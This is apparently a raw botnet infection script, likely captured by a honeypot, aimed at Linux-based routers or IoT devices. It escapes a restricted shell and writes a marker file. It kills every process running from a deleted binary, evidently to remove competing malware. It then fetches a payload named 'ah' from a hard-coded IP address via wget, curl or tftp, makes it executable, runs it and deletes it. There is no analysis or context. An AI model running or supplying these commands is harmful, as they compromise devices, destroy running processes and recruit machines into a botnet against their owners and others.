enable
system
shell
sh
linuxshell
cd /tmp/
echo "senpai" > rootsenpai
cat rootsenpai
rm -rf rootsenpai
for dir in /proc/[0-9]*; do grep -q "(deleted)" "$dir/maps" && echo "Killing process with PID: $(basename $dir)" && kill -9 $(basename $dir); done;
rm -rf ah
wget http://94.156.68.152/ah || curl -O http://94.156.68.152/ah || tftp 94.156.68.152 -c get ah || tftp -g -r ah 94.156.68.152
chmod 777 ah
./ah ssh
rm -rf ah
basename $dir
basename $dir